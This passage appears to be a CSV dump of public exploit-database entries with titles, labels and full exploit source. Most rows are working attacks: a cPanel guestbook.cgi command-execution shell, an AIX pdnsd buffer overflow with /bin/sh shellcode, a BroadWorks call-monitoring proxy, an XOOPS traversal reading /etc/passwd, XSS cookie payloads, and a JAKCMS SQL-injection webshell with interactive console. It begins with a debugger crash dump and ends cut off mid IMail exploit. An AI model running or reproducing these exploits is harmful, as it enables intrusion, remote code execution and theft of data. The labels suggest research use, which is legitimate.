ebx=059e8f80 ecx=00000000 edx=00000000 esi=004af564 edi=05392f78 eip=613211eb esp=004af4d0 ebp=004af4f8 iopl=0         nv up ei pl nz na po nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202 python35_d!product_setstate+0x13b: 613211eb 8b5108          mov     edx,dword ptr [ecx+8] ds:002b:00000008=???????? 0:000> k1 ChildEBP RetAddr   004af4f8 61553a22 python35_d!product_setstate+0x13b [c:\source\python-3.5.0b3\modules\itertoolsmodule.c @ 2266]  In some cases, EIP corruption may occur:  0:000> r eax=00000000 ebx=03e0f790 ecx=6d2ad658 edx=00000002 esi=03e0f790 edi=6d0dbb20 eip=00000000 esp=004cf6a0 ebp=004cf6ac iopl=0         nv up ei pl nz na po nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202 00000000 ??              ??? 0:000> k4 ChildEBP RetAddr WARNING: Frame IP not in any known module. Following frames may be wrong. 004cf69c 6d08a390 0x0 004cf6ac 6d02b688 python35!PyIter_Next+0x10 004cf6c0 6d0dbb6e python35!chain_next+0x58 004cf6d0 6d0a021d python35!wrap_next+0x4e  To fix this issue, it is recommended that product_setstate() be updated to clamp indices within a range from 0 up to the size of the pool in the body of the result tuple building loop.","[""'product_setstate()'""]",1
22262,"cPanel 5.0 - 'Guestbook.cgi' Remote Command Execution (3) source: https://www.securityfocus.com/bid/6882/info    A remote command execution vulnerability has been discovered in the cPanel CGI Application. This issue occurs due to insufficient sanitization of externally supplied data to the 'guestbook.cgi' script.    An attacker may exploit this vulnerability to execute commands in the security context of the web server hosting the affected script.    This vulnerability has been reported to affect cPanel version 5, previous versions may also be affected.    ##################################################### # cpanel-plus.pl exploit # Spawn bash style Shell on Apache CPANEL # # Spabam 2003 PRIV8 code # # spax@zone-h.org # This Script is currently under development ##################################################### use strict; use IO::Socket; my $host; my $port; my $command; my $url; my @results; my $probe; my @U; my $shit; $U[1] = ""/cgi-sys/guestbook.cgi?user=cpanel&template=|""; &intro; &scan; &choose; &command; &exit; sub intro { &help; &host; &server; sleep 3; }; sub host { print ""\nHost or IP : ""; $host=<STDIN>; chomp $host; if ($host eq """"){$host=""127.0.0.1""}; #print ""\nPort (enter to accept 80): ""; $shit=""|""; $port=""80""; chomp $port; if ($port =~/\D/ ){$port=""80""}; if ($port eq """" ) {$port = ""80""}; }; sub server { my $X; print ""\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n""; #print ""\nGet IIS string ...""; $probe = ""string""; my $output; my $webserver = ""something""; &connect; for ($X=0; $X<=10; $X++){         $output = $results[$X];         if (defined $output){         if ($output =~/IIS/){ $webserver = ""iis"" };         }; }; if ($webserver ne ""iis""){ #print ""\a\a\n\nWARNING : UNABLE TO GET IIS STRING.""; #print ""\nThis Server may not be running Micro\$oft IIS WebServer""; #print ""\n\n\nContinue anyway? ... [Y/N]""; my $choice = ""y""; chomp $choice; if ($choice =~/N/i) {&exit};             }else{ print ""\n\nOK"";         }; }; sub scan { my $status = ""not_vulnerable""; print ""\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n""; #print ""\nScanning $host on port $port ...""; my $loop; my $output; my $flag; $command=""dir""; for ($loop=1; $loop < @U; $loop++) { $flag = ""0""; $url = $U[$loop]; $probe = ""scan""; &connect; foreach $output (@results){ if ($output =~ /Directory/) {                               $flag = ""1"";                               $status = ""vulnerable"";                               };         }; if ($flag eq ""0"") { #print ""\nNo URL $loop...""; }else{ print ""\a\a\a\n$host VULNERABLE TO URL $loop !!!"";      }; }; if ($status eq ""not_vulnerable""){  #""SORRY $host is NOT Vulnerable to this Exploit."";                                 }; }; sub choose { #print ""\nSelect a URL (type 0 to input)""; my $choice=""0""; chomp $choice; if ($choice > @U){ &choose }; if ($choice =~/\D/g ){ &choose }; if ($choice == 0){ &other }; $url = $U[$choice]; #print ""\nURL: HTTP://$host$url""; }; sub other { #print ""\nURL [minus command] eg: HTTP://$host\/scripts\/cmd.exe?\/+""; #print ""\nHTTP://$host""; my $other = ""/cgi-sys/guestbook.cgi?user=cpanel&template=|""; chomp $other; $U[0] = $other; }; sub command { while ($command !~/quit/i) { #print ""\nHELP QUIT URL SCAN Or Command eg dir C: ""; print ""\n[$host]\$ ""; $command = <STDIN>; chomp $command; if ($command =~/quit/i) { &exit }; if ($command =~/url/i) { &choose }; if ($command =~/scan/i) { &scan }; if ($command =~/help/i) { &help }; $command =~ s/\s/+/g; #print ""HTTP://$host$url$command""; $probe = ""command""; if ($command !~/quit|url|scan|help/) {&connect}; }; &exit; }; sub connect { my $connection = IO::Socket::INET->new (                                 Proto => ""tcp"",                                 PeerAddr => ""$host"",                                 PeerPort => ""$port"",                                 ) or die ""\nSorry UNABLE TO CONNECT To $host On Port $port.\n""; $connection -> autoflush(1); if ($probe =~/command|scan/){ print $connection ""GET $url$command$shiz HTTP/1.1\r\nHost: $host\r\n\r\n""; }elsif ($probe =~/string/) { print $connection ""HEAD / HTTP/1.1\r\nHost: $host\r\n\r\n""; };  while ( <$connection> ) {                         @results = <$connection>;                          }; close $connection; if ($probe eq ""command""){ &output }; if ($probe eq ""string""){ &output }; }; sub output{ #print ""\nOUTPUT FROM $host. \n\n""; my $display; if ($probe eq ""string"") {                         my $X;                         for ($X=0; $X<=10; $X++) {                         $display = $results[$X];                         if (defined $display){print ""$display"";};                         sleep 1;                                 };                         }else{                         foreach $display (@results){                             print ""$display"";                             sleep 1;                                 };                           }; }; sub exit{ print ""\n\n\n SPABAM 2003.""; print ""\nspabam.tk spax\@zone-h.org""; print ""\n\n\n""; exit; }; sub help { print ""\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n""; print ""\n         CPANEL-PLUS 1.1 by SPABAM spax 2003""; print ""\n ""; print ""\n A CPANEL EXPLOIT WHICH SPAWN A BASH STYLE SHELL""; print ""\n note.. web directory is normally /var/www/html""; print ""\n""; print ""\n Host: www.victim.com or xxx.xxx.xxx.xxx (RETURN for 127.0.0.1)""; print ""\n\n\n\n\n\n\n\n\n\n\n\n""; };","[""'Guestbook.cgi'""]",1
21093,"AIX 4.1/4.2 - 'pdnsd' Remote Buffer Overflow // source: https://www.securityfocus.com/bid/3237/info  The Source Code Browser's Program Database Name Server Daemon (pdnsd) component of the C Set ++ compiler for AIX contains a remotely exploitable buffer overflow. This vulnerability allows local or remote attackers to compromise root privileges on vulnerable systems.  /*## copyright LAST STAGE OF DELIRIUM oct 1999 poland        *://lsd-pl.net/ #*/ /*## pdnsd                                                                   #*/  /*   note: to avoid potential system hang-up please, first obtain the exact   */ /*   AIX OS level with the use of some OS fingerprinting method               */  #include <sys/types.h> #include <sys/socket.h> #include <sys/time.h> #include <netinet/in.h> #include <netdb.h> #include <unistd.h> #include <stdio.h> #include <errno.h>  #define ADRNUM 4000 #define NOPNUM 4800 #define ALLIGN 1  #define SCAIX41 ""\x03\x68\x41\x5e\x6d\x7f\x6f\xd6\x57\x56\x55\x53"" #define SCAIX42 ""\x02\x71\x46\x62\x76\x8e\x78\xe7\x5b\x5a\x59\x58""  char syscallcode[]=     ""\x7e\x94\xa2\x79""     /* xor.    r20,r20,r20            */     ""\x40\x82\xff\xfd""     /* bnel    <syscallcode>          */     ""\x7e\xa8\x02\xa6""     /* mflr    r21                    */     ""\x3a\xc0\x01\xff""     /* lil     r22,0x1ff              */     ""\x3a\xf6\xfe\x2d""     /* cal     r23,-467(r22)          */     ""\x7e\xb5\xba\x14""     /* cax     r21,r21,r23            */     ""\x7e\xa9\x03\xa6""     /* mtctr   r21                    */     ""\x4e\x80\x04\x20""     /* bctr                           */     ""\xff\xff\xff\xff""     ""\xff\xff\xff\xff""     ""\xff\xff\xff\xff""     ""\x4c\xc6\x33\x42""     /* crorc   cr6,cr6,cr6            */     ""\x44\xff\xff\x02""     /* svca    0x0                    */     ""\x3a\xb5\xff\xf8""     /* cal     r21,-8(r21)            */ ;  char findsckcode[]=     ""\x2c\x74\x12\x34""     /* cmpi    cr0,r20,0x1234         */     ""\x41\x82\xff\xfd""     /* beql    <findsckcode>          */     ""\x7f\x08\x02\xa6""     /* mflr    r24                    */     ""\x3b\x36\xfe\x2d""     /* cal     r25,-467(r22)          */     ""\x3b\x40\x01\x01""     /* lil     r26,0x16               */     ""\x7f\x78\xca\x14""     /* cax     r27,r24,r25            */     ""\x7f\x69\x03\xa6""     /* mtctr   r27                    */     ""\x4e\x80\x04\x20""     /* bctr                           */     ""\xa3\x78\xff\xfe""     /* lhz     r27,-2(r24)            */     ""\xa3\x98\xff\xfa""     /* lhz     r28,-6(r24)            */     ""\x7c\x1b\xe0\x40""     /* cmpl    cr0,r27,r28            */     ""\x3b\x36\xfe\x59""     /* cal     r25,-423(r22)          */     ""\x41\x82\xff\xe4""     /* beq     <findsckcode+20>       */     ""\x7f\x43\xd3\x78""     /* mr      r3,r26                 */     ""\x38\x98\xff\xfc""     /* cal     r4,-4(r24)             */     ""\x38\xb8\xff\xf4""     /* cal     r5,-12(r24)            */     ""\x93\x38\xff\xf4""     /* st      r25,-12(r24)           */     ""\x88\x55\xff\xf6""     /* lbz     r2,-10(r21)            */     ""\x7e\xa9\x03\xa6""     /* mtctr   r21                    */     ""\x4e\x80\x04\x21""     /* bctrl                          */     ""\x37\x5a\xff\xff""     /* ai.     r26,r26,-1             */     ""\x2d\x03\xff\xff""     /* cmpi    cr2,r3,-1              */     ""\x40\x8a\xff\xc8""     /* bne     cr2,<findsckcode+32>   */     ""\x40\x82\xff\xd8""     /* bne     <findsckcode+48>       */     ""\x3b\x36\xfe\x03""     /* cal     r25,-509(r22)          */     ""\x3b\x76\xfe\x02""     /* cal     r27,-510(r22)          */     ""\x7f\x23\xcb\x78""     /* mr      r3,r25                 */     ""\x88\x55\xff\xf7""     /* lbz     r2,-9(r21)             */     ""\x7e\xa9\x03\xa6""     /* mtctr   r21                    */     ""\x4e\x80\x04\x21""     /* bctrl                          */     ""\x7c\x7a\xda\x14""     /* cax     r3,r26,r27             */     ""\x7e\x84\xa3\x78""     /* mr      r4,r20                 */     ""\x7f\x25\xcb\x78""     /* mr      r5,r25                 */     ""\x88\x55\xff\xfb""     /* lbz     r2,-5(r21)             */     ""\x7e\xa9\x03\xa6""     /* mtctr   r21                    */     ""\x4e\x80\x04\x21""     /* bctrl                          */     ""\x37\x39\xff\xff""     /* ai.     r25,r25,-1             */     ""\x40\x80\xff\xd4""     /* bge     <findsckcode+100>      */ ;  char shellcode[]=     ""\x7c\xa5\x2a\x79""     /* xor.    r5,r5,r5               */     ""\x40\x82\xff\xfd""     /* bnel    <shellcode>            */     ""\x7f\xe8\x02\xa6""     /* mflr    r31                    */     ""\x3b\xff\x01\x20""     /* cal     r31,0x120(r31)         */     ""\x38\x7f\xff\x08""     /* cal     r3,-248(r31)           */     ""\x38\x9f\xff\x10""     /* cal     r4,-240(r31)           */     ""\x90\x7f\xff\x10""     /* st      r3,-240(r31)           */     ""\x90\xbf\xff\x14""     /* st      r5,-236(r31)           */     ""\x88\x55\xff\xf4""     /* lbz     r2,-12(r21)            */     ""\x98\xbf\xff\x0f""     /* stb     r5,-241(r31)           */     ""\x7e\xa9\x03\xa6""     /* mtctr   r21                    */     ""\x4e\x80\x04\x20""     /* bctr                           */     ""/bin/sh"" ;  char nop[]=""\x7f\xff\xfb\x78"";  main(int argc,char **argv){     char buffer[10000],address[4],*b;     int i,n,l,cnt,sck;     struct hostent *hp;     struct sockaddr_in adr;      printf(""copyright LAST STAGE OF DELIRIUM oct 1999 poland  //lsd-pl.net/\n"");     printf(""pdnsd for AIX 4.1 4.2 PowerPC/POWER\n\n"");      if(argc!=3){         printf(""usage: %s address 41|42\n"",argv[0]);exit(-1);     }      switch(atoi(argv[2])){     case 41: memcpy(&syscallcode[32],SCAIX41,12); break;     case 42: memcpy(&syscallcode[32],SCAIX42,12); break;     default: exit(-1);     }      sck=socket(AF_INET,SOCK_STREAM,0);     adr.sin_family=AF_INET;     adr.sin_port=htons(4242);     if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1){         if((hp=gethostbyname(argv[1]))==NULL){             errno=EADDRNOTAVAIL;perror(""error"");exit(-1);         }         memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);     }      if(connect(sck,(struct sockaddr*)&adr,sizeof(struct sockaddr_in))<0){         perror(""error"");exit(-1);     }      l=ADRNUM+NOPNUM+strlen(shellcode);     *((unsigned long*)address)=htonl(0x2ff20908+(NOPNUM>>1));      i=sizeof(struct sockaddr_in);     if(getsockname(sck,(struct sockaddr*)&adr,&i)==-1){         struct netbuf {unsigned int maxlen;unsigned int len;char *buf;}nb;         ioctl(sck,(('S'<<8)|2),""sockmod"");         nb.maxlen=0xffff;         nb.len=sizeof(struct sockaddr_in);;         nb.buf=(char*)&adr;         ioctl(sck,(('T'<<8)|144),&nb);     }     n=ntohs(adr.sin_port);     printf(""port=%d connected! "",n);fflush(stdout);      findsckcode[0+2]=(unsigned char)((n&0xff00)>>8);     findsckcode[0+3]=(unsigned char)(n&0xff);      b=buffer;     *((unsigned long*)b)=htonl(l);     b+=4;     for(i=0;i<NOPNUM;i++) *b++=nop[i%4];     for(i=0;i<strlen(syscallcode);i++) *b++=syscallcode[i];     for(i=0;i<strlen(findsckcode);i++) *b++=findsckcode[i];     for(i=0;i<strlen(shellcode);i++)   *b++=shellcode[i];     for(i=0;i<ALLIGN;i++) *b++=address[i%4];     for(i=0;i<ADRNUM;i++) *b++=address[i%4];     *b=0;      write(sck,buffer,4+l-1);sleep(3);     send(sck,""x"",1,0);     printf(""sent!\n"");      write(sck,""/bin/uname -a\n"",14);     while(1){         fd_set fds;         FD_ZERO(&fds);         FD_SET(0,&fds);         FD_SET(sck,&fds);         if(select(FD_SETSIZE,&fds,NULL,NULL,NULL)){             int cnt;             char buf[1024];             if(FD_ISSET(0,&fds)){                 if((cnt=read(0,buf,1024))<1){                     if(errno==EWOULDBLOCK||errno==EAGAIN) continue;                     else break;                 }                 write(sck,buf,cnt);             }             if(FD_ISSET(sck,&fds)){                 if((cnt=read(sck,buf,1024))<1){                     if(errno==EWOULDBLOCK||errno==EAGAIN) continue;                     else break;                 }                 write(1,buf,cnt);             }         }     } }","[""'pdnsd'""]",1
34949,"BroadWorks - Call Detail Record Security Bypass source: https://www.securityfocus.com/bid/44597/info  BroadWorks is prone to a security-bypass vulnerability.  An attacker can exploit this issue to bypass certain security restrictions and to obtain sensitive information. Successful exploits will enable the attacker to monitor the incoming and outgoing calls of users in other enterprise groups.  BroadWorks versions R16 and prior are vulnerable.  #!/usr/env/python # Nick Freeman | vt  [ nick.freeman@security-assessment.com ] May 2k10  # When running the proxy, each request prompts for k, m, i or your input: # # K/Enter - forwards the packet # m 	  - automodifies the packet (see changeme and automod variables) # i 	  - prompts for a file containing usernames in the 098765@sp.com format # input	  - sends your raw input (i.e., paste an XML message in there) # # When you're auth'd and ready to monitor other users, generate a packet to BroadWorks (address book update for example), select 'i' and specify a file with usernames in it.  import socket, ssl, sys, re, time from xml.dom import minidom   # define local listening ip, port lhost = '127.0.0.1' lport = 1111  # define dest host, port, and domain dhost = '' dport = 1111 ddomregex = '@serviceprovider\.com.*' # SP's domain name, only regexd  # define automod changeme = 'CallClient' # the string to automagically change tothis = 'AttendantConsole' # what you want it to automagically change to  # define injection params userUid = '' # userUid of YOUR user (with AttendantConsole privs) applicationId = 'Client License 4' monitorpacket = '<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?><BroadsoftDocument protocol=""CAP"" version=""14.0""><command commandType=""monitoringUsersRequest""><commandData><user  userType=""AttendantConsole"" userUid=""' + userUid + '""><applicationId>'  + applicationId + '</applicationId><monitoring monType=""Add""/>QQQQ</user></commandData></command></BroadsoftDocument>' monUserLine = '<monUser>ZZ</monUser>'  # define logfile logfile = 'call-logs.txt'  # the listener ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM) ls.bind((lhost, lport)) print ""+ Bound to port "" + `lport` ls.listen(1) print ""+ Listening..\n""  # the sender ds = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sds = ssl.wrap_socket(ds)  # start listening lconn, addr = ls.accept() print '+ Connected by', addr  # connect to remote host sds.connect((dhost, dport)) print '+ Connected to remote host'  def local_packetgrab(): 	ldata = """" 	lconn.settimeout(1) 	try: 		ldata = lconn.recv(2048) 		if len(ldata) < 5: 			return 'nodata' 		# debug 		#print "">>>>>>>>>>>>>>>>>>>>>>>>>>\n"" 		#print ""Received data from client:\n"" 		#print "">>>>>>>>>>>>>>>>>>>>>>>>>>\n"" 		#print ldata 		# We have received some data, lets check if its finished or not 		while 1: 		    line = """" 		    try: 			line = lconn.recv(2048) 			# debug 			#print "">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n"" 			#print ""Received more data from client:\n"" 			#print "">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n"" 			#print line 			ldata += line 		    except socket.timeout: 			# debug 			#print ""No additional data received."" 			break  		    # possibly not necessary 	            if line == """":         	        break  	except socket.timeout: 		# No data received from client 		return 'nodata' 	 	if len(ldata) > 5: 		print "">>>>>>>>>>>>>>>>>\n"" 		print ""Data from client:\n"" 		print "">>>>>>>>>>>>>>>>>\n"" 		print ldata  		return ldata 	else: 		# No data received from client 		return 'nodata'   def remote_packetgrab(): 	ddata = """" 	sds.settimeout(1) 	try: 		ddata = sds.recv(2048) 		# debug 		#print ""<<<<<<<<<<<<<<<<<<<<<<<<<<\n"" 		#print ""Received data from server:\n"" 		#print ""<<<<<<<<<<<<<<<<<<<<<<<<<<\n"" 		#print ddata 		# We have received from data, lets check if its finished or not 		while 1: 			dline = """" 			try: 				dline = sds.recv(2048) 				# debug 				#print ""<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<\n"" 				#print ""Received more data from server:\n"" 				#print ""<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<\n"" 				#print dline 				ddata += dline 			except: 				# debug 				#print ""No additional data received.\n"" 				break  	except: 		# No data received from server 		return 'nodata'  	if len(ddata) > 5: 		print ""<<<<<<<<<<<<<<<<<\n"" 		print ""Data from server:\n"" 		print ""<<<<<<<<<<<<<<<<<\n"" 		print ddata  		# do CDR grab  		if re.search('callUpdate', ddata): 			logme = open(logfile, 'a') 			# it be a call packet 			xmldoc = minidom.parseString(ddata) 			if re.search('remoteTelUri', ddata): 			   if re.search('\<state\>2', ddata): 				# it be an incoming call 				callTo = xmldoc.getElementsByTagName('monitoredUserId')[0].toxml() 				callTo = re.sub('\<monitoredUserId\>', '', callTo) 				callTo = re.sub(ddomregex, '', callTo)   				callFrom = xmldoc.getElementsByTagName('remoteTelUri')[0].toxml() 				callFrom = re.sub('\<remoteTelUri\>tel\:', '', callFrom) 				callFrom = re.sub('\<\/remote.*', '', callFrom)				 				localtime = time.asctime( time.localtime(time.time()) ) 				logstring = ""["" + localtime + ""]: Incoming call to "" + callTo + "" from "" + callFrom + ""!\n"" 				logme.write(logstring) 				print logstring 				logme.close() 			else: 			   if re.search('\<state\>2', ddata): 				# it be an outgoing call 				callFrom = xmldoc.getElementsByTagName('monitoredUserId')[0].toxml() 				callFrom = re.sub('\<monitoredUserId\>', '', callFrom) 				callFrom = re.sub(ddomregex, '', callFrom)   				callTo = xmldoc.getElementsByTagName('remoteNumber')[0].toxml() 				callTo = re.sub('\<remoteNumber\>', '', callTo) 				callTo = re.sub('\<\/remote.*', '', callTo)				  				localtime = time.asctime( time.localtime(time.time()) ) 				logstring = ""["" + localtime + ""]: Outgoing call from "" + callFrom + "" to "" + callTo + ""!\n"" 				logme.write(logstring) 				print logstring 				logme.close()   		return ddata 	else: 		# No data received from server 		return 'nodata'   def packet_handle(packet): 	user_input = raw_input(""ACTION: 'k', 'm', 'i' or your input:\n-------------------------------\n"") 	if user_input == 'k' or user_input == '': 		print ""Sending request as is..\n"" 		print ""-----------------------\n"" 		return packet 	elif user_input == 'm': 		print ""Sending auto-modded request..\n"" 		print ""-----------------------------\n"" 		packet = re.sub(changeme, tothis, packet) 		return packet 	elif user_input == ""i"": 		filename = raw_input(""Input file containing usernames:\n--------------------------------\n""); 		try: 			file = open(filename, 'r') 		except:  			filename = raw_input(""File does not exist. Try again:\n-------------------------------\n"") 		file_line = 0  		injection_input = '' 		for each_line in file: 			print ""Read line: "" + each_line 			mond_user = re.sub('ZZ', each_line, monUserLine) 			injection_input = injection_input + mond_user 			file_line = file_line + 1 			if file_line >= 100: 				evilpacket = re.sub('QQQQ', injection_input, monitorpacket) 				print ""Sending injection packet.."" 				print ""--------------------------\n"" 				evilpacket = re.sub('\n', '', evilpacket) 				print evilpacket 				sds.send(evilpacket) 				file_line = 0 						  		# we have now got 100 users to add. send the packet, then continue sorting through users.			 		if len(injection_input) > 10: 			evilpacket = re.sub('QQQQ', injection_input, monitorpacket) 			print ""Sending injection packet.."" 			print ""--------------------------\n"" 			evilpacket = re.sub('\n', '', evilpacket) 			print evilpacket 			sds.send(evilpacket) 		 		# after all injection is done, return initial packet 		file.close() 		return packet  	else: 		print ""Sending modified packet..\n"" 		print ""-------------------------\n"" 		return user_input 	    while 1: 	# Debug 	#print ""Checking for client packet..\n"" 	print "">"" 	local_data = local_packetgrab() 	if local_data != 'nodata' and len(local_data) > 5: 		lpacket_tosend = packet_handle(local_data) 		sds.send(lpacket_tosend)  	# Debug 	#print ""Checking for server packet..\n"" 	print ""<"" 	remote_data = remote_packetgrab() 	if remote_data != 'nodata' and len(remote_data) > 5: 		rpacket_tosend = packet_handle(remote_data) 		lconn.send(rpacket_tosend)",['098765@sp.com'],0
32097,XOOPS 2.0.18 - '/modules/system/admin.php?fct' Traversal Local File Inclusion source: https://www.securityfocus.com/bid/30330/info  XOOPS is prone to a local file-include vulnerability and a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit the local file-include vulnerability using directory-traversal strings to view local files within the context of the webserver process. Information harvested may aid in further attacks.  The attacker may leverage the cross-site scripting issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.  XOOPS 2.0.18.1 is vulnerable; other versions may also be affected.  http://www.example.com/scripts_path/modules/system/admin.php?fct=../../../../../../../../../../etc/passwd%00,"[""'/modules/system/admin.php?fct'""]",1
27259,Noah's Classifieds 1.0/1.3 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/16772/info  Noah's Classifieds is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. These may facilitate the theft of cookie-based authentication credentials as well as other attacks.  http://www.example.com/classifieds/index.php?inf=%3Cscript%3Ealert(document.cookie)%3C/script%3Ehttp://www.example.com/classifieds/index.php?inf=%3Cscript%3Ealert(document.cookie)%3C/script%3E   http://www.example.com/classifieds/index.php?upperTemplate=%3Cscript%3Ealert(document.cookie)%3C/script%3E,"[""'index.php'""]",1
16200,"JAKCMS 2.01 - Code Execution #!/usr/bin/python # # JAKCMS <= v2.01 Code Execution Exploit # Explanation: # # During the authentication process, a check is performed to ensure that the user accessing the page is not already logged in. # This process is done by validating the cookies set in the browser as 'JAK_COOKIE_NAME' and 'JAK_COOKIE_PASS'. If the cookies # are found to be set, then an SQL statement is executed to help validate if the user is logged in. This functionaility contains # a blind SQL Injection vulnerability, triggerable through both the 'JAK_COOKIE_NAME' and 'JAK_COOKIE_PASS' variables. # # If a valid query is provided and it returns a result set, then the user is granted access to the administrative console by setting # the session variable 'JAKLoggedIn' to true. Below is a snippet of code from the 'class/class.userlogin.php' page on lines 65-76 # highlighting the vulnerable code. # # public static function jakChecklogged() # { #    global $jakdb; #    if ((isset($_COOKIE['JAK_COOKIE_NAME']) && isset($_COOKIE['JAK_COOKIE_PASS'])) || isset($_SESSION['JAKLoggedIn'])) { #       $sql = 'SELECT * FROM '.DB_PREFIX.'user WHERE ((username = ""'.COOKIE_NAME.'"" AND password = ""'.COOKIE_PASS.'"") OR (sessi$ #       $result = $jakdb->query($sql); #       if ($jakdb->affected_rows > 0) { #          $row = $result->fetch_assoc(); #          $_SESSION['JAKLoggedIn'] = true; # # Additionally, functionality in the backend, allows an administrative user to add a ""php_hook"" whereby adding php content to a # page on the website. This allows an attacker essentially backdoor the website in a single request. # # [mr_me@pluto jak]$ python jakcmsCodeExecution.py -p localhost:8080 -t 192.168.1.7 -d /webapps/jak/ # #	| ------------------------------------------- | #	| JAKcms <= v2.01 0day Code Execution Explo!t | #	| by mr_me - net-ninja.net ------------------ | # # (+) Testing proxy @ localhost:8080.. proxy is found to be working! # (+) Targeting http://192.168.1.7/ # (!) Exploit working! # (+) Entering interactive remote console (q for quit) # # mr_me@192.168.1.7# id # uid=33(www-data) gid=33(www-data) groups=33(www-data) #  # mr_me@192.168.1.7# uname -a # Linux steven-desktop 2.6.32-28-generic #55-Ubuntu SMP Mon Jan 10 21:21:01 UTC 2011 i686 GNU/Linux #  # mr_me@192.168.1.7# q       import sys import urllib import re import urllib2 import getpass import base64 from optparse import OptionParser  usage = ""./%prog [<options>] -t [target] -d [directory]"" usage += ""\nExample: ./%prog -p localhost:8080 -t 192.168.1.7 -d /webapps/jak/""  parser = OptionParser(usage=usage) parser.add_option(""-p"", type=""string"",action=""store"", dest=""proxy"",                   help=""HTTP Proxy <server:port>"") parser.add_option(""-t"", type=""string"", action=""store"", dest=""target"",                   help=""The Target server <server:port>"") parser.add_option(""-d"", type=""string"", action=""store"", dest=""dirPath"",                   help=""Directory path to the CMS"")  (options, args) = parser.parse_args()  def banner(): 	print ""\n\t| -------------------------------------- |"" 	print ""\t| JAKcms <= v2.01 Code Execution Explo!t |"" 	print ""\t| by mr_me - net-ninja.net ------------- |\n""  if len(sys.argv) < 5:     banner()     parser.print_help()     sys.exit(1)  def testProxy(): 	check = 1 	sys.stdout.write(""(+) Testing proxy @ %s.. "" % (options.proxy)) 	sys.stdout.flush() 	try:         	req = urllib2.Request(""http://www.google.com/"") 		req.set_proxy(options.proxy,""http"") 		check = urllib2.urlopen(req)     	except:         	check = 0         	pass     	if check != 0:         	sys.stdout.write(""proxy is found to be working!\n"")         	sys.stdout.flush()     	else:         	print ""proxy failed, exiting..""         	sys.exit(1)  def interactiveAttack():         print ""(+) Entering interactive remote console (q for quit)\n""         hn = ""%s@%s# "" % (getpass.getuser(), options.target)         preBaseCmd = """"         while preBaseCmd != 'q':                 preBaseCmd = raw_input(hn)                 cmd64 = base64.b64encode(preBaseCmd)                 cmdResp = getServerResponse(options.target + options.dirPath + ""index.php?p=sitemap&lol="" + cmd64, """", """") 		result = cmdResp.split(""<!DOCTYPE html"")[0] 		print result  def getServerResponse(exploit, header=None, data=None): 	        try: 		if header != None: 			headers = {} 			headers['Cookie'] = header 		if data != None: 			data = urllib.urlencode(data) 		req = urllib2.Request(""http://""+exploit, data, headers) 		if options.proxy: 			req.set_proxy(options.proxy,""http"") 		check = urllib2.urlopen(req).read()			 	except urllib.error.HTTPError, error: 		check = error.read() 	except urllib.error.URLError: 		print ""(-) Target connection failed, check your address"" 		sys.exit(1) 	return check  def doEvilRequest(): 	print ""(+) Targeting http://%s/"" % (options.target) 	phpShell = ""system(base64_decode($_GET['lol']));"" 	req = options.target + options.dirPath + ""admin/index.php?p=plugins&sp=newhook"" 	funnycookie = ""JAK_COOKIE_PASS=test; JAK_COOKIE_NAME=admin\""))+and+1=1--+;"" 	data = {'jak_name':'lol', 'jak_hook':'php_sitemap', 'jak_plugin':'0', 'jak_exorder':'1', 'jak_phpcode': phpShell} 	check = getServerResponse(req, funnycookie, data)  	if re.search(""Successful"", check): 		print ""(!) Exploit working!"" 		interactiveAttack() 	else: 		print ""(-) Exploit failed, exiting.."" 		sys.exit(1)  def main(): 	banner() 	if options.proxy: 		testProxy() 	doEvilRequest()  if __name__ == ""__main__"": 	main()","[""userlogin.php'""]",1
627,"IPSwitch IMail 8.13 - 'DELETE' Remote Stack Overflow #!/usr/bin/perl -w ################################### # # IPSwitch-IMail-8.13-DELETE # # Discovered by : Muts # Coded by : Zatlander # WWW.WHITEHAT.CO.IL # ################################## # # Plain vanilla stack overflow in the DELETE command # Restrictions: #   - Need valid authentication credentials #   - Input buffer only allows characters between x20 -> x7e # # Credits: #   - http://www.metasploit.org  - HD Moore for the metasploit shellcode #   - http://www.edup.tudelft.nl/~bjwever/menu.html - skylined for the ALPHA ascii shellcode generator #   - http://www.hick.org - for the syscall egghunt code in the paper ""Understanding Windows Shellcode"" # ##################################  use IO::Socket; use Getopt::Std; use Mail::IMAPClient;  print ""Exploit for the IPSwitch IMail DELETE buffer overflow\n""; print ""C0d3d by Zatlander\n""; print ""Discovered by Muts\n""; print ""WWW.WHITEHAT.CO.IL\n""; print ""For hacking purposes only!!!\n\n"";  # Find shellcode with signature ""w00tw00t""; start from esp # from 0 -> $egghunter = ""TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIVSyBUco0OKbWdp00ptH0uXqRnkHH2a3PLMvtvqzm6NulfePabTiaxbycrb09Gjt5xkTySjeTsEzFmSo2eXyoKRA""; $egghunter = ""TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJINkN44skpmkt7fPTpptx0UXpBLKkx1Q3PLMtT4QxMVN5lc5sQSDxqyrjSW2VYUJRUXkp9SjVdT5KVosKrWxioKRA"";  # Real shellcode: bind shell on port 4444 ( ./alpha edx < shellcode.bin ) $shellcode = 